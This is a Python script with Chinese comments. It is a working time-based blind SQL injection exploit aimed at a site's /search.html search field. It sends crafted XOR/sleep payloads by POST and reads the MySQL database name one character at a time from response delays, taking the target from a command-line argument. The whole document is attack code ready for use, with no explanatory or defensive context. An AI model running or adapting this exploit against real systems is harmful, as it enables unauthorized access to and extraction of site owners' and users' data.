# -*- coding:utf-8 -*-
import urllib.request
import urllib.parse
import urllib
import time
import string
import sys
import random


def exp(target_domain):
    headers = {} #消息头信息
    payloadlist = "abcdefghijklmnopqrstuvwxyz0123456789@_.ABCDEFGHIGKLMNOPQRSTUVWXYZ:" #做POC时可适当更改
    print("[%s] Start to retrive MySQL DB(time-based blind):" % time.strftime('%H:%M:%S', time.localtime())) #开始检测并计时
    db= ""
    for i in range(1, 10): #DB 长度
        for payload in payloadlist:
            #构造检测目标URL
            url = "/search.html"
            target_url = target_domain + url

            #构造POST发送数据
            s = "kw='XOR(if(now()=sysdate(),sleep(if(greatest(ascii(mid(database(),%s,1)),1)=%s,4,0)),0))OR'" % (i, ord(payload))
            post_data = {
            "kw": s,
            } #POST数据填写格式： 参数:数据内容
            
            req = urllib.request.Request(target_url, data = urllib.parse.urlencode(post_data).encode("UTF-8"), method = "POST")
            start_time = time.time() #设定访问页面的起始时间
            response = urllib.request.urlopen(req)
            data = response.read()
            print('.', end = "")
                
            if time.time() - start_time > 8.0: #设定访问页面的将诶书时间
                db += payload
                print('\n[In progress]', urllib.parse.unquote(s)) #输出成功获得DB内容的exp
                print("[in progress]", db) #输出已经获得的DB内容
                time.sleep(5.0) #延迟请求时间，按需设定
                break
    print("\n[Done] MySQL DB is %s" % db)

def main():
    args = sys.argv
    url = ""
    if len(args) == 2:
        domain = args[1]
        exp(domain)
    else:
        print("Usage: python %s url" % (args[0]))

if __name__ == "__main__":
    main()
    
